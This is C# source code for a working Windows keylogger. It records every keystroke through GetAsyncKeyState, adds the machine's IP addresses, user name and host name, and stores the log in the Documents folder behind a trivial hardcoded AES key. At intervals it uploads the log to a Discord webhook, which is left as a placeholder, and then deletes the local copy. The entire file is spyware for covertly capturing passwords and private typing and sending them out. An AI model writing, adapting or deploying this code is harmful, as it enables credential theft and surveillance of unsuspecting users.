using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Net.Http;
using System.Net;

namespace mail
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static public String verifyKey(int code)
        {
            String key = "";

            switch (code)
            {
                case 8: key = " back "; break;
                case 9: key = "\t"; break;
                case 13: key = "\n"; break;
                case 19: key = "pause"; break;
                case 20: key = " caps_lock "; break;
                case 27: key = "esc"; break;
                case 32: key = " "; break;
                case 33: key = "pg_up"; break;
                case 34: key = "pg_down"; break;
                case 35: key = "end"; break;
                case 36: key = "home"; break;
                case 37: key = " left "; break;
                case 38: key = " up "; break;
                case 39: key = " right "; break;
                case 40: key = " down "; break;
                case 44: key = " print_screen "; break;
                case 45: key = " insert "; break;
                case 46: key = " delete "; break;
                case 48: key = "0"; break;
                case 49: key = "1"; break;
                case 50: key = "2"; break;
                case 51: key = "3"; break;
                case 52: key = "4"; break;
                case 53: key = "5"; break;
                case 54: key = "6"; break;
                case 55: key = "7"; break;
                case 56: key = "8"; break;
                case 57: key = "9"; break;
                case 65: key = "a"; break;
                case 66: key = "b"; break;
                case 67: key = "c"; break;
                case 68: key = "d"; break;
                case 69: key = "e"; break;
                case 70: key = "f"; break;
                case 71: key = "g"; break;
                case 72: key = "h"; break;
                case 73: key = "i"; break;
                case 74: key = "j"; break;
                case 75: key = "k"; break;
                case 76: key = "l"; break;
                case 77: key = "m"; break;
                case 78: key = "n"; break;
                case 79: key = "o"; break;
                case 80: key = "p"; break;
                case 81: key = "q"; break;
                case 82: key = "r"; break;
                case 83: key = "s"; break;
                case 84: key = "t"; break;
                case 85: key = "u"; break;
                case 86: key = "v"; break;
                case 87: key = "w"; break;
                case 88: key = "x"; break;
                case 89: key = "y"; break;
                case 90: key = "z"; break;
                case 91: key = " windows "; break;
                case 92: key = " windows "; break;
                case 93: key = " list "; break;
                case 96: key = "0"; break;
                case 97: key = "1"; break;
                case 98: key = "2"; break;
                case 99: key = "3"; break;
                case 100: key = "4"; break;
                case 101: key = "5"; break;
                case 102: key = "6"; break;
                case 103: key = "7"; break;
                case 104: key = "8"; break;
                case 105: key = "9"; break;
                case 106: key = "*"; break;
                case 107: key = "+"; break;
                case 109: key = "-"; break;
                case 110: key = ","; break;
                case 111: key = "/"; break;
                case 112: key = "F1"; break;
                case 113: key = "F2"; break;
                case 114: key = "F3"; break;
                case 115: key = "F4"; break;
                case 116: key = "F5"; break;
                case 117: key = "F6"; break;
                case 118: key = "F7"; break;
                case 119: key = "F8"; break;
                case 120: key = "F9"; break;
                case 121: key = "F10"; break;
                case 122: key = "F11"; break;
                case 123: key = "F12"; break;
                case 144: key = " num_lock "; break;
                case 145: key = " scroll_lock "; break;
                case 160: key = " shift "; break;
                case 161: key = " shift "; break;
                case 162: key = " ctrl "; break;
                case 163: key = " ctrl "; break;
                case 164: key = " alt "; break;
                case 165: key = " alt "; break;
                case 187: key = "="; break;
                case 188: key = ","; break;
                case 189: key = "-"; break;
                case 190: key = "."; break;
                case 192: key = "'"; break;
                case 191: key = ";"; break;
                case 193: key = "/"; break;
                case 194: key = "."; break;
                case 219: key = "`"; break;
                case 220: key = "]"; break;
                case 221: key = "["; break;
                case 222: key = "~"; break;
                case 226: key = "\\"; break;
            }
            return key;
        }

        static public void sendData(string url)
        {
            String folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folder + @"\new.txt";
            HttpClient httpClient = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();
            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            httpClient.PostAsync(url, content).Wait();
            httpClient.Dispose();
        }
        static async Task Main(string[] args)
        {
            long seconds = 0;
            String data = "";
            DateTime now = DateTime.Now;
            data += "Keylogs\n";
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.AddressList)
            {
                data += "Address: " + address;
                data += "\n";
            }
            data += "\nUser Name: " + Environment.UserName;
            data += "\nHost: " + host;
            data += "\nTime: " + now.ToString() + "\n\n";
            while (true)
            {
                Thread.Sleep(50);
                ++seconds;
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == -32767 || keyState == 1)
                    {
                        data += verifyKey(i);
                    }

                }
                if (seconds % 500 == 0)
                {
                    String folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                    try
                    {
                        using (FileStream fileStream = new(folder + @"\TestData.txt", FileMode.Create))
                        {
                            using (Aes aes = Aes.Create())
                            {
                                byte[] key =
                                {
                                    0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
                                };
                                aes.Key = key;

                                byte[] iv = aes.IV;
                                fileStream.Write(iv, 0, iv.Length);

                                using (CryptoStream cryptoStream = new(
                                    fileStream,
                                    aes.CreateEncryptor(),
                                    CryptoStreamMode.Write))
                                {
                                    using (StreamWriter encryptWriter = new(cryptoStream))
                                    {
                                        encryptWriter.Write($"{data}");
                                    }
                                }
                            }
                        }

                        Console.WriteLine("The file was encrypted.");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"The encryption failed. {ex}");
                    }


                    try
                    {
                        using (FileStream fileStream = new(folder + @"\TestData.txt", FileMode.Open))
                        {
                            using (Aes aes = Aes.Create())
                            {
                                byte[] iv = new byte[aes.IV.Length];
                                int numBytesToRead = aes.IV.Length;
                                int numBytesRead = 0;
                                while (numBytesToRead > 0)
                                {
                                    int n = fileStream.Read(iv, numBytesRead, numBytesToRead);
                                    if (n == 0) break;

                                    numBytesRead += n;
                                    numBytesToRead -= n;
                                }

                                byte[] key =
                                {
                                    0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
                                };

                                using (CryptoStream cryptoStream = new(
                                   fileStream,
                                   aes.CreateDecryptor(key, iv),
                                   CryptoStreamMode.Read))
                                {
                                    using (StreamReader decryptReader = new(cryptoStream))
                                    {
                                        string decryptedMessage = await decryptReader.ReadToEndAsync();
                                        File.WriteAllText(folder + @"\new.txt", decryptedMessage);
                                        Console.WriteLine($"The decrypted original message: {decryptedMessage}");
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"The decryption failed. {ex}");
                    }
                    string discordHoo = "Your_Discord_Hook";
                    sendData(discordHoo);
                    File.Delete(folder + @"\new.txt");
                    data = "";
                    DateTime nows = DateTime.Now;
                    data += "Keylogs\n";
                    var hosts = Dns.GetHostEntry(Dns.GetHostName());
                    foreach (var addresses in hosts.AddressList)
                    {
                        data += "Address: " + addresses;
                        data += "\n";
                    }
                    data += "\nUser Name: " + Environment.UserName;
                    data += "\nHost: " + hosts;
                    data += "\nTime: " + nows.ToString();
                    data += "\n\n";
                }
            }
        }
    }

}